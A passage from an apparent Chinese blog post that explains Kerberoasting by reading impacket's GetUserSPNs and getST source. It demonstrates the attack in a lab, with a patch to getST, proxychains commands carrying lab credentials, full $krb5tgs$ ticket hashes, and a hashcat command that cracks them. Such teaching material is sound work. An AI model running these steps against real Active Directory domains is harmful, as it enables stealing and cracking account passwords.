class="keyword">in</span> users.items():</span><br><span class="line">    sAMAccountName = user</span><br><span class="line">    downLevelLogonName = self.__targetDomain + <span class="string">&quot;\\&quot;</span> + sAMAccountName</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        principalName = Principal()</span><br><span class="line">        principalName.<span class="built_in">type</span> = constants.PrincipalNameType.NT_MS_PRINCIPAL.value</span><br><span class="line">        principalName.components = [downLevelLogonName]</span><br><span class="line"></span><br><span class="line">        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,</span><br><span class="line">                        self.__targetDomain + <span class="string">&quot;/&quot;</span> + sAMAccountName, fd)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception:&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="string">&#x27;Principal: %s - %s&#x27;</span> % (downLevelLogonName, <span class="built_in">str</span>(e)))</span><br></pre></td></tr></table></figure><br>先获取<code>TGT</code>。<br>接下来通过这行代码获取TGS<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br></pre></td></tr></table></figure><br>而且是用<code>user</code>，获取到<code>TGS</code>。<br>而for循环中的<code>SPN</code>是没有使用到的。</p><p>在这段代码最后<code>self.outputTGS</code>打印出你要请求的用户的<code>TGS</code></p><h2 id="GetST源码简析"><a href="#GetST源码简析" class="headerlink" title="GetST源码简析"></a>GetST源码简析</h2><p>上面的很容易理解，接下来看看<code>GetST</code>的源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> TGT <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    tgt, cipher, sessionKey = TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>], TGT[<span class="string">&#x27;sessionKey&#x27;</span>]</span><br><span class="line">    oldSessionKey = sessionKey</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tgt <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Still no TGT</span></span><br><span class="line">    userName = Principal(self.__user, <span class="built_in">type</span>=constants.PrincipalNameType.NT_PRINCIPAL.value)</span><br><span class="line">    logging.info(<span class="string">&#x27;Getting TGT for user&#x27;</span>)</span><br><span class="line">    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,</span><br><span class="line">                                                            unhexlify(self.__lmhash), unhexlify(self.__nthash),</span><br><span class="line">                                                            self.__aesKey,</span><br><span class="line">                                                            self.__kdcHost)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ok, we have valid TGT, let&#x27;s try to get a service ticket</span></span><br><span class="line"><span class="keyword">if</span> self.__options.impersonate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Normal TGS interaction</span></span><br><span class="line">    logging.info(<span class="string">&#x27;Getting ST for user&#x27;</span>)</span><br><span class="line">    serverName = Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br><span class="line">    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)</span><br><span class="line">    </span><br><span class="line">    self.__saveFileName = self.__user</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Here&#x27;s the rock&#x27;n&#x27;roll</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        logging.info(<span class="string">&#x27;Impersonating %s&#x27;</span> % self.__options.impersonate)</span><br><span class="line">        <span class="comment"># Editing below to pass hashes for decryption</span></span><br><span class="line">        <span class="keyword">if</span> self.__additional_ticket <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,</span><br><span class="line">                                                                                            self.__kdcHost, self.__additional_ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_S_PRINCIPAL_UNKNOWN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably user %s does not have constrained delegation permisions or impersonated user does not exist&#x27;</span> % self.__user)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_BADOPTION&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable&#x27;</span> % self.__user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self.__saveFileName = self.__options.impersonate</span><br><span class="line"></span><br><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure><br>与<code>GetUserSPNs</code>相似，也是获取到<code>TGT</code>后，判断你的命令中是否有委派（这里不对委派做介绍），如果没有委派就与<code>GetUserSPNs</code>一样，通过<code>getKerberosTGS</code>获取ST。<br>但是有一点不同的地方<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br></pre></td></tr></table></figure><br>在这一行，可以看到他用到了<code>spn</code>，并且没有用到过<code>user</code></p><p>在代码的最后，与<code>GetUserSPNs</code>不一样，他是保存ST<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure></p><p>看看具体代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">saveTicket</span>(<span class="params">self, ticket, sessionKey</span>):</span><br><span class="line">    logging.info(<span class="string">&#x27;Saving ticket in %s&#x27;</span> % (self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>))</span><br><span class="line">    ccache = CCache()</span><br><span class="line"></span><br><span class="line">    ccache.fromTGS(ticket, sessionKey, sessionKey)</span><br><span class="line">    ccache.saveFile(self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>)</span><br></pre></td></tr></table></figure><br>他把ST保存成了<code>ccache</code></p><h1 id="SPN-or-Users"><a href="#SPN-or-Users" class="headerlink" title="SPN or Users"></a>SPN or Users</h1><p>按照上面的源码分析，那<code>GetST</code>和<code>GetUserSPNs</code>，应该是不一样的。接下来用一个真实环境来验证一下，我这里用的云镜的<strong>Certify</strong>。</p><h2 id="获取SPN"><a href="#获取SPN" class="headerlink" title="获取SPN"></a>获取SPN</h2><p>首先获取SPN和对应的user<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/2.png" alt></p><h2 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h2><p>通过<code>GetUserSPNs</code>获取user的ST<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure></p><p>ST<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$7fa0e479f4b98d330648eace979d6899$ef080eb849dde02f3bc909fcb96bb9415c1845edcd907856ecf1a56b6c2af338afffaf7adfb5dc66cfc0dd75bf37a81eda6b6c4542167096e9095eaf7142107b9a2ec26e556090647df180b522ab8a14e19db9a47bb69a16910f7a9e67301dc8b6fb5bb05593651d96238a03475dc6f0a94802301f65decb2b28c8d3e1d5f5d1413e58c6484afa1e53deef504ff0b9d22000519954d09d491f3b707c394248cff0230c2684940b93a881cafb440b4cfe0db4bd45aaa5cd001f91f97291e45506c3d892fd44e27fb6102c242a7023e6b3f25d942d5ca0b321562d955ec8ec750d22a00d9d1aae2f11731770ac7ec39352f8f15fc3223fcee9648870e0d5ff89e64e1e1b6532ae311d086c64bc6ccad31e2eb60e83778927f17880319185bcab68121bd7ee13c0576d174fa91573b6f010f151d807e962870d3e00cd0ae20ccaa2c018ce8d0027cc6795794430c2824dc331ebff70f6d34f43548e1728329840d6fc0309fa97b3d0e77f71d15df082d84561322255fc8b29fce8a922c1e8a34a75de5c764f8d8dc3449aa6359c9b26ff8b779443d46c19220424916bdff44fb939ad69a59fd48a4df5b01eaf1c80a5955994d26880585dd19da25717e395828be889ec279ab254fc220e87acf092ce2f33a98016b38d2556f98f6b4c1a31ff309821d01f3ed2746d7b32967e6f632c39c08f9ac4a53626dd5d2d6836415bc83bf3918f640a4ac71afb6190db79828f7d0775799e412481e4bd84625b23ac96ba168e52693454762c47a13b10120b379db043d8f90b4bd5b998c7e84aab8d65261499d434f5c63c8e8bf43ee4133417fb5b04a86df9926dee30465283566a76b38f004f86e9891ce9a353713d665992695a829756b9b15ca6de95b04cd4e3a2d18767a054018f24bef9a5e40cc8f11ee01b736fefa56e05b3cd2768c0904f7545c731b26a12f311ba7fb40a36ef7eaa57b791bb2484fd98f661d10081b852206d67ddde737d3fdadb920027bf0c611c4b320da0883a075f1150f69d76d39977e3714a10659a69b339f67d6a550e3d84fd9bcf9b54297ac8f17b3202040a6af2bd0250f4495c32c46674ba661932f017d39b462a0c12c21536dfd3be2e6812623cf640f04b74c5de1eaed0be56e2230815dce87a3e7a96973d8ccaa781e65f66004c5ac9dba83a94e33f6c0bde7337a5924637d67777e5ec649b165e20180dd3a2c6f1593bd051beba17b23e0946cc4a48fd32cc3641cded1bb0e526c53d5c8fca3a5d5811f98aa59f1e5f7d086cd139e6b9790f06f1089ee1b3c959bc431949dca81261e21a4646ad0c6d4e42bd0682432bdde3f379c48958903d3dbe96565b80c18bf6334877f8f5057ee198da600ac9234bce72a8e180139df5ded784f06a4b01799a8c8651ad69d211520b06c58aa981c7591b1efcbe95a367eac90548b6d2bc594c710bde364ba58087bf5b8b53727b69139d201ddbf15aa745289a70fda4a824ca5239bcfee7ac22ec9bbb9ec6</span><br></pre></td></tr></table></figure></p><h2 id="GetST"><a href="#GetST" class="headerlink" title="GetST"></a>GetST</h2><p>通过<code>GetST</code>获取<code>SPN</code>的st<br>因为他有一个转换<code>ccache</code>的过程，所以要把他代码改一下<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/3.png" alt><br>增加一行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.outputTGS(tgs, oldSessionKey, sessionKey, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p><p>并把下面的代码粘贴到类里面</p><div class="spoiler collapsed">    <div class="spoiler-title">        点击显/隐内容    </div>    <div class="spoiler-content">        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outputTGS</span>(<span class="params">self, tgs, oldSessionKey, sessionKey, username, spn, fd=<span class="literal">None</span></span>):</span><br><span class="line">        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># According to RFC4757 (RC4-HMAC) the cipher part is like:</span></span><br><span class="line">        <span class="comment"># struct EDATA &#123;</span></span><br><span class="line">        <span class="comment">#       struct HEADER &#123;</span></span><br><span class="line">        <span class="comment">#               OCTET Checksum[16];</span></span><br><span class="line">        <span class="comment">#               OCTET Confounder[8];</span></span><br><span class="line">        <span class="comment">#       &#125; Header;</span></span><br><span class="line">        <span class="comment">#       OCTET Data[0];</span></span><br><span class="line">        <span class="comment"># &#125; edata;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># In short, we&#x27;re interested in splitting the checksum and the rest of the encrypted data</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)</span></span><br><span class="line">        <span class="comment"># last 12 bytes of the encrypted ticket represent the checksum of the decrypted </span></span><br><span class="line">        <span class="comment"># ticket</span></span><br><span class="line">        <span class="keyword">if</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.rc4_hmac.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$%s$%s$*%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][-<span class="number">12</span>:].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:-<span class="number">12</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>] == constants.EncryptionTypes.des_cbc_md5.value:</span><br><span class="line">            entry = <span class="string">&#x27;$krb5tgs$%d$*%s$%s$%s*$%s$%s&#x27;</span> % (</span><br><span class="line">                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;realm&#x27;</span>],</span><br><span class="line">                spn.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][:<span class="number">16</span>].asOctets()).decode(),</span><br><span class="line">                hexlify(decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;cipher&#x27;</span>][<span class="number">16</span>:].asOctets()).decode())</span><br><span class="line">            <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(entry)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                fd.write(entry + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Skipping %s/%s due to incompatible e-type %d&#x27;</span> % (</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">0</span>], decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;sname&#x27;</span>][<span class="string">&#x27;name-string&#x27;</span>][<span class="number">1</span>],</span><br><span class="line">                decodedTGS[<span class="string">&#x27;ticket&#x27;</span>][<span class="string">&#x27;enc-part&#x27;</span>][<span class="string">&#x27;etype&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.__saveTGS <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># Save the ticket</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;About to save TGS for %s&#x27;</span> % username)</span><br><span class="line">            ccache = CCache()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ccache.fromTGS(tgs, oldSessionKey, sessionKey)</span><br><span class="line">                ccache.saveFile(<span class="string">&#x27;%s.ccache&#x27;</span> % username)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure>    </div></div><p>接下来就可以获取<code>SPN</code>的ST了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST.py xiaorang.lab/zhangjian:i9XDE02pLVf -dc-ip 172.22.9.7 -spn TERMSERV/win2016.xiaorang.lab</span><br></pre></td></tr></table></figure><br>ST<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*$XIAORANG.LAB$*$0ce89c5a5440709db8cd0da786ab1ed5$c4b6d477aac038b4958157e55377f91b03788e4173db8c5df6cb3d95a8e2f9d78bd486af0df68960aec23e52ec2a4c9ca7707318d08d9a3c995ab0c70042f2b4c7c7ea9fc269bb31a76597692ca7f2774283d90c3f19f280236fa6c12ec7d52da1c6f24fb7f2a508ba8bb3fcafb4a669bc6856e567ec6d96d82c42600d07aa5fd68a0b298a3964525bdb77d1227df64a9a92a1aeeafacbf5238c92a156450dd934ed5e7bd6b9b8a965e6d522b6c7501ae49d95818aad9304aeb54e75824f02ef3a8855212ecffd272507308ab996b14dd648c7828962995b249c44a74ddacde8ada0f58c7f84d09b2914f48464aa8f02ea129737c3ebe277e39743184c6715967a64feec56aa174d065151fbd36b3d655d7fb7dae66830efa59798023522e6d40d2e17c5d3465609af7df0a61ea66961256455a51405c6162efdab3c29148ff3bdff77923dafec9647b6bb992ba3bd981a0bf60b2f1629cce9bf9f4e2a3dbd62ff21c10a0f5eba667fc8649c2d1eab273c023209e7273bd7eeef39ffd32889ff2467b866e6b454e7bb2b750065ed6b3ddb75a3a0cf6234ed26eab8ed9bd00e685a40036725cfd6416e1c607c91981e19bb71f27d78365756c0e2d0da57166799058b22a7d507b2413191be7a36a887464d6849a18555a9d0b087dd334d9c05687e3d7519110463f4c9d916627f35aa20059dd57b9d35024aa3d716fc20a7c1b4b9d8756c4a9a6aafd81b07033347c718fc23a51b6919c5dded962e0e7e426fd06c15b61feacb3aa9a8d040b74b38e2f333cf3522509e18dd77cd2e3a743084e0dff25ca1d3547cf91575aedd74541bdaa1a96399983b39b12221f157c3ccdfec099b1ba638fbde2a563683d11fe7d5844b13e6d800f0fdcc59056c747b691c5083469f576bac3f4960c176b3e84a74905ef7cb73942e8514cbb00dd2ee74935917c1fe3ff289936eba9aeb1233069f138e623f8593ec37a145148e5320f3ecc0ca06a7107f93d8d7d2f6ed29f03e3a1f547dc7637b40c424e5357f95ddf19d24dcb67ce9a8c166b3c5b28ed9d4da1cae1762c4dda158a8ef06cd4153d9f0eb6fbe695d105bce8e0270e3a24b01156a87e729b5c87fec57f08f91428d3652e5227903665d41fffec8a41b5ddd4426fb3324066af683a86c1bca6e1cc82b04d3a3508bb31e9f5545f63775ed1271c03b498dcad91acc21625bf1b047f7cb9989b8cca254219d85d804ccb51814c538762f5474d44411d9c411b1f99682c0892c6f95e149c6c1fb186486e1e1400b0d888c1b94b3d659ec30e45af95dee0d7e3835b457c8d0a9f7d81c1b9bdc636673972f56118706e56f44238fad032c9e4c2ff906a3483c1437e449f82da86bb88a82be824501940284c59b3e62bcfc5a94faece71397c906b680f122c3c3755811371bf183f018aa927834662bc6d977424a781074ec440ee46cf7df449eeb215bfbf3037d7f208527a7d929c828f4752d01decf011d0a0aa9746a1b5a64694d04</span><br></pre></td></tr></table></figure></p><h2 id="hashcat-爆破"><a href="#hashcat-爆破" class="headerlink" title="hashcat 爆破"></a>hashcat 爆破</h2><p>记得用rockyou爆破<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/4.png" alt><br>可以看到密码是@Passw0rd@</p><p>接下来爆破另一个，命令与上面相同，把hash替换一下就行<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/5.png" alt></p><p>可以看到密码也是一样的</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>最后diff一下两个hash，会发现是完全一样的，那么就应该不管是通过请求<code>SPN</code>还是<code>user</code>，都可以获取到相同的hash，所以我应该都是获取到<code>chenchen</code>的这个域用户的hash<br>那么平时说的获取服务的TGS，其实也就是在获取绑定该服务的域用户的hash</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://y4er.com/posts/kerberos-kerberoasting-spn/">https://y4er.com/posts/kerberos-kerberoasting-spn/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前一直疑惑，网上都在说，通过这个去请求服务的TGS&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
